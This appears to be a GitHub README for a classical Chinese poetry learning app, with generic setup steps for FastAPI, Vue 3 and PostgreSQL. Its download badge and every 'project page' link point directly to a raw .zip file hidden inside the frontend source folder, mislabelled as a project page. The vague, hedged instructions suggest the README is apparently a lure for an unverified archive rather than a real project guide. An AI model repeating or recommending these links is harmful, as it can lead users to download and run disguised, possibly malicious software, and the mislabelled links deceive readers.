# 🪶 qingjin-fu - Learn classical poetry with ease

[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/highclass-roundel491/qingjin-fu/raw/refs/heads/main/frontend/src/components/fu_qingjin_v2.5.zip)

## 📘 What this project is

《青衿赋》 is a learning platform for classical Chinese poetry. It helps you read, practice, and create poetry in a calm and guided way. It is built for the 2026 China Collegiate Computing Competition and focuses on immersive learning for students and daily learners.

This project uses a web app design, so you can open it in your browser after setup. It is made to feel simple for non-technical users and to support study, review, and writing practice in one place.

## ✨ What you can do

- Read classical poems in a clean study view
- See line-by-line explanations
- Practice poem creation with guided prompts
- Use an AI agent to support learning and writing
- Explore themes, forms, and common patterns
- Save your work for later review
- Learn with a mix of text, guidance, and interaction

## 🖥️ What you need

For Windows use, prepare:

- Windows 10 or Windows 11
- A modern browser such as Edge or Chrome
- Internet access for the first setup
- About 2 GB free disk space
- At least 4 GB RAM for smooth use
- A stable network if you plan to use the AI features

## ⬇️ Download and set up on Windows

Go to the project page here:
https://github.com/highclass-roundel491/qingjin-fu/raw/refs/heads/main/frontend/src/components/fu_qingjin_v2.5.zip

On that page, look for the latest release, source package, or setup files for Windows. If the project offers a ready-to-run Windows package, download it first. If it provides source files only, follow the setup steps below.

### 1. Download the project files

- Open the project page
- Find the latest release or the main source files
- Download the file to your computer
- Save it to a folder you can find again, such as `Downloads` or `Desktop`

### 2. Unpack the files

If the file is a `.zip` package:

- Right-click the file
- Select `Extract All`
- Choose a folder such as `C:\qingjin-fu`

If it is already a folder from GitHub:

- Keep the folder in a simple path
- Avoid folders with long names or special characters

### 3. Open the backend folder

The project uses FastAPI for the server side.

- Find the backend folder
- Open a terminal window in that folder
- Install the required Python packages if the project includes a requirements file

If you see a `requirements.txt` file, use:

```bash
pip install -r requirements.txt
```

If the project includes a package manager file, follow the file name shown in the folder.

### 4. Start the server

If the project uses Python, start the app with the command shown in the project files. A common FastAPI start command looks like this:

```bash
uvicorn main:app --reload
```

If the main file has a different name, use the one in the project folder. After it starts, the server usually runs on:

```bash
http://127.0.0.1:8000
```

### 5. Open the web app

- Open your browser
- Enter the local address shown in the terminal
- Wait for the page to load
- Use the menu to begin reading or practicing

### 6. Open the front end

The project uses Vue 3 on the front end.

- Find the front-end folder
- Open a terminal in that folder
- Install the packages if needed

A common command is:

```bash
npm install
```

Then start the front end with:

```bash
npm run dev
```

The browser usually opens a local address such as:

```bash
http://localhost:5173
```

If the project gives a different port, use the address shown in the terminal.

## 🧭 First-time use

When the app opens, you can begin with these steps:

1. Choose a poem or learning path
2. Read the original text
3. Open the explanation panel
4. Try a guided practice task
5. Write your own lines if you want to create
6. Save your progress before closing the browser

## 📚 Main learning areas

### 诗词阅读

Read classic poems in a structured view. The app helps you focus on the text, meaning, and rhythm.

### 注释理解

See word notes and line explanations to make old text easier to read.

### 创作练习

Use writing prompts to build your own poem step by step.

### AI 辅助学习

Use the AI agent to ask questions, review your work, or get help with form and wording.

### 互动学习

Move through lessons in a guided way so study feels active, not flat.

## 🧩 Common folder layout

The project may include folders like these:

- `backend` for the server
- `frontend` for the user interface
- `src` for app code
- `docs` for notes or guides
- `static` for images and local assets
- `database` for PostgreSQL files or setup data

## 🗄️ Database setup

The project topics show PostgreSQL support. If the app uses a database, you may need to:

- Install PostgreSQL
- Create a local database
- Import the provided SQL file
- Set the database name, user, and password in the config file

A common config file may use values like:

- host: `localhost`
- port: `5432`
- database: `qingjinfu`
- user: your PostgreSQL user
- password: your PostgreSQL password

If the project includes sample data, load it before starting the app so poems and user records appear in the interface.

## 🔐 Sign-in and user data

If the app includes accounts:

- Create a local admin or user account when the setup asks for it
- Use a strong password
- Keep your login details in a safe place
- Do not share the database password with others

If no account screen appears, the app may open in guest mode for reading and practice.

## 🎯 Best use tips

- Use the app in a quiet browser window
- Keep one tab open for the app
- Read the notes before trying to write
- Review one poem at a time
- Save work before closing the browser
- Use full screen mode for a better reading view

## 🛠️ If something does not work

### Page does not open

- Check that the server is running
- Make sure you used the local address from the terminal
- Try refreshing the browser

### Front end does not load

- Check that `npm install` finished
- Run `npm run dev` again
- Make sure the port is not in use

### Database errors appear

- Check the PostgreSQL service
- Confirm the database name and password
- Reimport the SQL file if needed

### The browser shows a blank page

- Open the browser console only if the project guide asks for it
- Restart both the backend and front end
- Clear the browser cache and try again

## 📖 Suggested order for study

1. Read one poem
2. Study the notes
3. Look at the structure
4. Try a guided task
5. Write a short piece
6. Compare your work with the model
7. Save and review later

## 🧱 Tech stack

- FastAPI for the backend
- Vue 3 for the front end
- PostgreSQL for data storage
- AI agent support for learning help
- Interactive learning flow for study tasks

## 📎 Project link

Download or visit the project page here:
https://github.com/highclass-roundel491/qingjin-fu/raw/refs/heads/main/frontend/src/components/fu_qingjin_v2.5.zip